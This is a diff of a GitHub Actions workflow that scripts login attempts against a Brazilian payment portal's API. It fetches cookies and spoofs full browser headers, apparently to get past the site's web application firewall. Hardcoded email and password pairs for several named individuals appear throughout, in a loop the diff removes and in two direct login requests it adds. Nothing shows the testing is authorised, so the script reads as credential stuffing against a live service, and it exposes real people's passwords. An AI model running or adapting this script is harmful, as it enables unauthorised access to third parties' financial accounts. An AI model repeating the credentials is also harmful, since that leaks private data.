@@ -1,25 +1,32 @@
-name: waf-test-v3
+name: waf-login-v4
 on:
   workflow_dispatch:
 jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-    - name: Full WAF + Login Test
+    - name: Full login test with all browser headers
       run: |
         UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
         BASE="https://wpdataservice.wisepay.com.br"
         
         echo "=== IP ==="
-        curl -s https://api.ipify.org
-        echo ""
+        curl -s https://api.ipify.org && echo
         
-        echo "=== GET /users/theme ==="
-        curl -s -m 15 -A "$UA" "$BASE/users/theme" | head -c 200
         echo ""
+        echo "=== Obter cookies com GET primeiro ==="
+        curl -v -m 15 -c /tmp/cookies.txt \
+          -A "$UA" \
+          -H "Accept: application/json, text/plain, */*" \
+          -H "Accept-Language: pt-BR,pt;q=0.9" \
+          -H "Accept-Encoding: gzip, deflate, br" \
+          -H "type-application: web" \
+          "$BASE/users/theme" 2>&1 | grep -E "(< |Set-Cookie|200|403)"
         
-        echo "=== POST /login (headers do browser real) ==="
-        curl -v -m 15 \
+        echo ""
+        echo "=== POST /login com TODOS os headers Sec + cookies ==="
+        curl -v -m 20 \
+          -b /tmp/cookies.txt \
           -A "$UA" \
           -H "Accept: application/json, text/plain, */*" \
           -H "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7" \
@@ -27,28 +34,27 @@ jobs:
           -H "Content-Type: application/json" \
           -H "Origin: https://portal.wisepay.com.br" \
           -H "Referer: https://portal.wisepay.com.br/login" \
+          -H "Sec-Ch-Ua: \"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"" \
+          -H "Sec-Ch-Ua-Mobile: ?0" \
+          -H "Sec-Ch-Ua-Platform: \"Windows\"" \
           -H "Sec-Fetch-Dest: empty" \
           -H "Sec-Fetch-Mode: cors" \
           -H "Sec-Fetch-Site: same-site" \
           -H "type-application: web" \
+          -H "Connection: keep-alive" \
           -X POST "$BASE/login" \
           -d '{"email":"icelaserbelem@gmail.com","password":"ICELASER2021"}' \
-          -w "\nSTATUS:%{http_code}" 2>&1 | tail -20
+          -w "\nSTATUS:%{http_code}" 2>&1
         
         echo ""
-        echo "=== POST /login (outros usuários) ==="
-        for CRED in "lenildo.silva@outlook.com:Rede@4321" "niveareis@gmail.com:937495jeF!" "fabiane@petcenterbrasil.com.br:08710871"; do
-          EMAIL="${CRED%%:*}"
-          PASS="${CRED##*:}"
-          CODE=$(curl -s -m 15 -A "$UA" \
-            -H "Content-Type: application/json" \
-            -H "Origin: https://portal.wisepay.com.br" \
-            -H "Referer: https://portal.wisepay.com.br/login" \
-            -H "Sec-Fetch-Site: same-site" \
-            -H "Sec-Fetch-Mode: cors" \
-            -H "type-application: web" \
-            -X POST "$BASE/login" \
-            -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" \
-            -w "%{http_code}" -o /tmp/login_resp.txt)
-          echo "$CODE $EMAIL | $(head -c 150 /tmp/login_resp.txt)"
-        done
+        echo "=== POST com lenildo.silva (Rede@4321) ==="
+        curl -s -m 15 \
+          -A "$UA" \
+          -H "Content-Type: application/json" \
+          -H "Origin: https://portal.wisepay.com.br" \
+          -H "Referer: https://portal.wisepay.com.br/login" \
+          -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
+          -H "type-application: web" \
+          -X POST "$BASE/login" \
+          -d '{"email":"lenildo.silva@outlook.com","password":"Rede@4321"}' \
+          -w "\nHTTP:%{http_code}"
